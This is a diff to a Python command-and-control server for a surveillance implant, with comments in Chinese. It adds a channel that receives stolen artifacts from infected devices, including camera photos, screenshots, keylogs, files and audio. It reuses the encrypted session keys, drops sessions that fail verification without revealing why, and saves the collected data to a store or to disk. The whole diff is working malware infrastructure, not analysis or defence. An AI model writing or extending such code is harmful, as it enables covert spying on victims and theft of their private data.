@@ -22,6 +22,7 @@ import os
 import struct
 import time
 import uuid
+import hashlib
 from typing import Optional, Dict, Tuple, Callable
 
 from crypto_layer import GCM, hmac_sha256, sha256
@@ -31,6 +32,18 @@ from key_derivation import (
 )
 from frame import (SealedEnvelope, ReplayWindow, ReplayKey, InvalidFrame,
                    ROLE_CLIENT, ROLE_SERVER)
+from exfil_sink import (ExfilSink, ExfilError, CELL_WIRE,
+                        EXF_TYPE_CAMERA_JPEG, EXF_TYPE_SCREENSHOT,
+                        EXF_TYPE_KEYLOG, EXF_TYPE_FILE, EXF_TYPE_AUDIO)
+
+# 产物类型 -> 文件扩展名（仅用于可选的文件落盘；不是类型判定依据）
+ARTIFACT_EXT = {
+    EXF_TYPE_CAMERA_JPEG: "jpg",
+    EXF_TYPE_SCREENSHOT: "png",
+    EXF_TYPE_KEYLOG: "txt",
+    EXF_TYPE_FILE: "bin",
+    EXF_TYPE_AUDIO: "bin",
+}
 
 # ---------------------------------------------------------------------------
 # 消息类型（帧层 msg_type 域）
@@ -45,6 +58,7 @@ MSG_TASK_RESULT    = 0x12   # 通用任务结果回执（预留）
 MSG_HEARTBEAT      = 0x20   # 心跳：payload = 时间戳(8B)，用于拉取待执行任务
 MSG_FRAME_DATA     = 0x21   # 采集帧回传：payload = {request_id(16B) || format(4B) || size(4B) || data}
 MSG_FRAME_META     = 0x22   # 帧元数据（不含像素数据）：灯光状态、失败原因等
+MSG_EXFIL_CELL     = 0x23   # 采集产物回传：payload = 一个 512 字节定长信元（21_exfil）
 
 # 握手
 MSG_HELLO          = 0x01
@@ -83,6 +97,9 @@ class SessionState:
         self.seq_out = 0          # 本端发送序号
         self.transcript = b""      # 握手 transcript
         self.handshake_hash = b""
+        self.k_c2s: Optional[bytes] = None   # 会话密钥：植入端 -> 服务端
+        self.k_s2c: Optional[bytes] = None   # 会话密钥：服务端 -> 植入端
+        self.exfil_sink = None     # 采集产物接收端（惰性建立）
         self.created_at = time.time()
 
 
@@ -101,7 +118,7 @@ class C2Server:
     """
 
     def __init__(self, psk: bytes, salt_reg: bytes, server_static_id: bytes,
-                 replay_capacity: int = 1024):
+                 replay_capacity: int = 1024, store=None, artifact_dir: Optional[str] = None):
         if len(psk) < 16:
             raise ValueError("PSK must be >= 128 bits")
         if len(salt_reg) != HKDF_SALT_REG_LEN:
@@ -111,6 +128,13 @@ class C2Server:
         self._salt_reg = salt_reg
         self._server_static_id = server_static_id
         self._replay = ReplayWindow(capacity=replay_capacity)
+
+        # 采集产物落库。store 为 None 时不落库，仅走 _artifact_received 钩子。
+        self._store = store
+        # artifact_dir 非空时额外落文件（默认不落，避免明文散落磁盘）
+        self._artifact_dir = artifact_dir
+        if artifact_dir:
+            os.makedirs(artifact_dir, exist_ok=True)
 
         # 会话表：implant_id -> SessionState
         self._sessions: Dict[str, SessionState] = {}
@@ -164,6 +188,10 @@ class C2Server:
         # SealedEnvelope(k_send, k_recv, role)
         # 服务端发送用 s2c，接收用 c2s
         sess.envelope = SealedEnvelope(k_s2c, k_c2s, ROLE_SERVER)
+        # 保存会话密钥：采集产物接收端（exfil_sink）要基于它派生信元层密钥。
+        # 不保存的话就无法复用同一套会话密钥，回传通道与命令通道会分裂成两套。
+        sess.k_c2s = k_c2s
+        sess.k_s2c = k_s2c
         sess.state = SessionState.ESTABLISHED
 
     # ------------------------------------------------------------------
@@ -254,6 +282,8 @@ class C2Server:
             self._on_frame(sess, payload)
         elif msg_type == MSG_FRAME_META:
             self._on_frame_meta(sess, payload)
+        elif msg_type == MSG_EXFIL_CELL:
+            self._on_exfil_cell(sess, payload)
         else:
             self._drop(sess.implant_id, f"unknown msg_type: {msg_type}")
 
@@ -284,6 +314,72 @@ class C2Server:
         """帧接收钩子，子类可覆写实现落盘/分发。"""
         # 默认：不落盘，仅记录引用
         pass
+
+    # ------------------------------------------------------------------
+    # 采集产物回传（21_exfil 定长信元流 -> 落库）
+    # ------------------------------------------------------------------
+
+    def _exfil_sink(self, sess: SessionState):
+        """惰性建立并缓存接收端。密钥取自本会话派生结果，与命令通道同一套。"""
+        if sess.exfil_sink is not None:
+            return sess.exfil_sink
+        if sess.k_c2s is None or sess.k_s2c is None:
+            raise C2ProtocolError("session keys unavailable")
+        sink = ExfilSink.for_implant(sess.k_c2s, sess.k_s2c,
+                                     self._server_static_id, sess.implant_id)
+        sess.exfil_sink = sink
+        return sink
+
+    def _on_exfil_cell(self, sess: SessionState, payload: bytes):
+        """喂入一个信元。一批收满（收到 FIN）时落库。"""
+        if len(payload) != CELL_WIRE:
+            raise C2ProtocolError(f"exfil cell must be {CELL_WIRE} bytes")
+
+        sink = self._exfil_sink(sess)
+        try:
+            rec = sink.feed(payload)
+        except ExfilError:
+            # AEAD / CRC / 格式失败一律静默关闭，不回显原因（不泄露判定依据）
+            self._drop(sess.implant_id, "exfil verification failed")
+            return
+
+        if rec is None:
+            return                      # 累积中，或喂入的是覆盖信元
+
+        artifact_id = None
+        if self._store is not None:
+            artifact_id = self._store.put_artifact(
+                sess.implant_id, sess.generation, rec["type"], rec["seq"],
+                rec["ts_us"], rec["width"], rec["height"], rec["flags"],
+                rec["name"], rec["payload"])
+        if self._artifact_dir:
+            self._write_artifact_file(sess, rec)
+        self.on_artifact(sess.implant_id, rec, artifact_id)
+
+    def _write_artifact_file(self, sess: SessionState, rec: dict):
+        """可选：额外落文件。
+
+        路径只用受控字段构造 —— 远端设备名（rec["name"]）绝不参与拼路径，
+        否则一个含 "../" 的设备名就能把产物写到任意位置。
+        """
+        safe = hashlib.sha256(sess.implant_id.encode("utf-8")).hexdigest()[:16]
+        d = os.path.join(self._artifact_dir, safe)
+        os.makedirs(d, exist_ok=True)
+        ext = ARTIFACT_EXT.get(rec["type"], "bin")
+        fn = f"{rec['seq']:016x}_{rec['ts_us']:016x}.{ext}"
+        with open(os.path.join(d, fn), "wb") as f:
+            f.write(rec["payload"])
+
+    def on_artifact(self, implant_id: str, rec: dict, artifact_id):
+        """产物落库钩子，子类覆写做分发 / 告警 / 分析。"""
+        pass
+
+    def exfil_incomplete(self, implant_id: str) -> bool:
+        """该 implant 是否有未收满的批。连接断开时应据此判定产物残缺。"""
+        sess = self._sessions.get(implant_id)
+        if sess is None or sess.exfil_sink is None:
+            return False
+        return sess.exfil_sink.incomplete
 
     # ------------------------------------------------------------------
     # 任务下发
